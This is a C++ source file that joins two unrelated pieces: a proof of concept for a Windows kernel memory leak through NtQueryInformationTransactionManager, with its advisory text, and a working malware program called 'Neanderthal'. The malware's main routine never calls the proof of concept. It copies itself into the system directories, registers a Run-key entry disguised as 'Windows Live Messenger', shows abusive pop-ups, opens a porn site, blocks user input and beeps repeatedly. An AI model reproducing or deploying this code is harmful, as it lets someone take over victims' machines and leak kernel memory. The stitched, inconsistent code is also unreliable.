#include <windows.h>
#include <fstream>
#include <winuser.h>
 
using namespace std;

/*
We have discovered that the nt!NtQueryInformationTransactionManager system call invoked with the TransactionManagerRecoveryInformation (4) information class may disclose uninitialized kernel pool memory to user-mode clients. The vulnerability affects Windows 7 to 10, 32/64-bit.

The output structure for the infoclass in question is an 8-byte TRANSACTIONMANAGER_RECOVERY_INFORMATION:

--- cut ---
  typedef struct _TRANSACTIONMANAGER_RECOVERY_INFORMATION {
    ULONGLONG LastRecoveredLsn;
  } TRANSACTIONMANAGER_RECOVERY_INFORMATION, *PTRANSACTIONMANAGER_RECOVERY_INFORMATION;
--- cut ---

We've observed the entire returned value to consist of uninitialized bytes originating from a kernel pool allocation, and more specifically an object of type TmTransactionManagerObjectType.

The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that all 8 bytes of output are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:

--- cut ---
  C:\>NtQueryInformationTransactionManager.exe
  Status: 0, Return Length: 8
  00000000: 2d 2d 2d 2d 2d 2d 2d 2d ?? ?? ?? ?? ?? ?? ?? ?? --------........

  C:\>NtQueryInformationTransactionManager.exe
  Status: 0, Return Length: 8
  00000000: 3f 3f 3f 3f 3f 3f 3f 3f ?? ?? ?? ?? ?? ?? ?? ?? ????????........

  C:\>NtQueryInformationTransactionManager.exe
  Status: 0, Return Length: 8
  00000000: 57 57 57 57 57 57 57 57 ?? ?? ?? ?? ?? ?? ?? ?? WWWWWWWW........

  C:\>NtQueryInformationTransactionManager.exe
  Status: 0, Return Length: 8
  00000000: 71 71 71 71 71 71 71 71 ?? ?? ?? ?? ?? ?? ?? ?? qqqqqqqq........
--- cut ---

Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
*/

#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <KtmW32.h>

#include <cstdio>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "KtmW32.lib")

extern "C" {
  NTSTATUS NTAPI NtQueryInformationTransactionManager(
    _In_      HANDLE                               TransactionManagerHandle,
    _In_      TRANSACTIONMANAGER_INFORMATION_CLASS TransactionManagerInformationClass,
    _Out_     PVOID                                TransactionManagerInformation,
    _In_      ULONG                                TransactionManagerInformationLength,
    _Out_opt_ PULONG                               ReturnLength
  );
};

VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
  PBYTE Data = (PBYTE)Buffer;
  for (ULONG i = 0; i < dwBytes; i += 16) {
    printf("%.8x: ", i);

    for (ULONG j = 0; j < 16; j++) {
      if (i + j < dwBytes) {
        printf("%.2x ", Data[i + j]);
      }
      else {
        printf("?? ");
      }
    }

    for (ULONG j = 0; j < 16; j++) {
      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
        printf("%c", Data[i + j]);
      }
      else {
        printf(".");
      }
    }

    printf("\n");
  }
}

int poc() {
  HANDLE hTransactionMgr = CreateTransactionManager(NULL, NULL, TRANSACTION_MANAGER_VOLATILE, 0);

  TRANSACTIONMANAGER_RECOVERY_INFORMATION Information;
  DWORD ReturnLength = 0;
  NTSTATUS Status = NtQueryInformationTransactionManager(hTransactionMgr, TransactionManagerRecoveryInformation, &Information, sizeof(Information), &ReturnLength);

  printf("Status: %x, Return Length: %x\n", Status, ReturnLength);
  PrintHex(&Information, sizeof(Information));

  CloseHandle(hTransactionMgr);

  return 0;
}


int main()
{       
    char system[MAX_PATH];
    char windows[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system,sizeof(system));
    GetWindowsDirectory(windows,sizeof(windows));
    strcat(system,"\\najort5g.exe");
    strcat(windows,"\\najort5g.exe");
    CopyFile(pathtofile,system,false);
    CopyFile(pathtofile,windows,false);
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
    RegSetValueEx(hKey, "Windows Live Messenger",0,REG_SZ,(const unsigned char*)system,sizeof(system));
    RegCloseKey(hKey);  
     
    void messageset();
    void pornpopup();
    void payload();
     
    int y = 1;
    while(y<10)
    {
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)messageset, NULL, 0, NULL);
      Sleep(60000);
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pornpopup, NULL, 0, NULL);
      Sleep(60000);
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
      Sleep(60000);
    }
}
 
    void messageset()
    {
       if(MessageBox(
       NULL,
       "Neanderthal is watching you",
       "Neanderthal",
       MB_OKCANCEL)==IDCANCEL)
       {
       MessageBox(
       NULL,
       "You can't cancel me mother fucker!",
       "Neanderthal",
       MB_OK);
       }
    }
 
     void pornpopup()
    {  
       char Website[MAX_PATH] = "www.porn.com";
       ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
     
       MessageBox(
       NULL,
       "Naughty, Naughty, looking at porn are we now?... Dispicable",
       "Neanderthal",
       MB_OK);
    }
     
        
     
     void payload()
     {
       int a = 1;
     
       while(a<100)
       {
          BlockInput(TRUE);
          SetCursorPos(500,500);
          Sleep(3000);
          a++;
       }
     
       Sleep(10000);
       int freq = 100;
       int loop = 1;
       while(loop<200)
       {       
           Beep(freq,100);
           Sleep(50);
           freq++;
           loop++;
       }
    }